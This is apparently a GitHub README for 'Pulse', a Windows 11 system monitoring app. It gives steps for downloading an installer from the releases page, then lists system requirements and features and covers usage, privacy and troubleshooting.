# 📊 pulse-system-monitor - View your computer performance with ease

[![Download Pulse](https://img.shields.io/badge/Download-Latest%20Version-blue.svg)](https://github.com/Carleybaritone135/pulse-system-monitor/releases)

Pulse shows you how your computer runs in real time. It monitors your hardware and programs through a clean interface designed for Windows 11. You see exactly what uses your CPU, memory, and network at any moment.

1. Visit the [Pulse release page](https://github.com/Carleybaritone135/pulse-system-monitor/releases).
2. Look for the section labeled "Assets" at the bottom of the newest release.
3. Click the file that ends in .msix or .exe to start your download.
4. Open the downloaded file once your browser finishes the transfer.
5. Follow the standard Windows prompts to complete the installation process.

## 🖥️ System Requirements

Pulse runs on modern hardware. Ensure your computer meets these items to get the best results:

* Operating System: Windows 11.
* Processor: Intel Core i3 or equivalent (or better).
* Memory: 4 gigabytes of RAM.
* Display: 1920x1080 resolution for the best view of graphs.

## 🛠️ Main Features

Pulse provides tools to track your machine health. You gain insight into your system through these functions:

* Live Hardware Tracking: Observe your CPU, graphics card, and memory speeds in real time.
* Per-Process Network: See which internet-connected applications take up your bandwidth.
* Sensor Monitoring: Track temperatures for your processor and drive to prevent overheating.
* Custom Themes: Switch between light and dark modes to match your desktop setup.
* Task Management: Stop unresponsive applications with a single click.
* Tray Mini-Graphs: View tiny charts in your system tray to keep an eye on usage while you work.
* Auto-Updates: Receive new improvements automatically when you open the application.

## 📖 How to use the app

Start the application from your Start Menu after installation. The main window appears with several tabs. 

Use the "Performance" tab to see large graphs showing your total system load. Each line represents a different hardware component. You can change the time range to see history for the last minute or last hour. 

Use the "Processes" tab to manage active programs. Click the column headers to sort the list by memory or processor usage. Right-click any program in this list to end the task if it slows down your device.

The "Settings" icon in the bottom corner allows you to change the visual theme. You can also toggle the "Start on Boot" option here if you want Pulse to launch when you log in to Windows.

## 🔒 Privacy and Security

Pulse operates as a local tool. It reads data directly from your hardware sensors and Windows system APIs. The program sends no data to external servers. Your system information stays on your machine at all times. 

## 💡 Troubleshooting

If the program fails to open, verify you have the latest updates for Windows 11 installed. Some hardware sensors require current drivers to report data correctly. Restart your machine if you notice that the mini-graphs in the tray do not update as expected. 

You can uninstall the app through the Apps & Features section of your Windows Settings if you choose to remove it. This removes all associated files from your device.
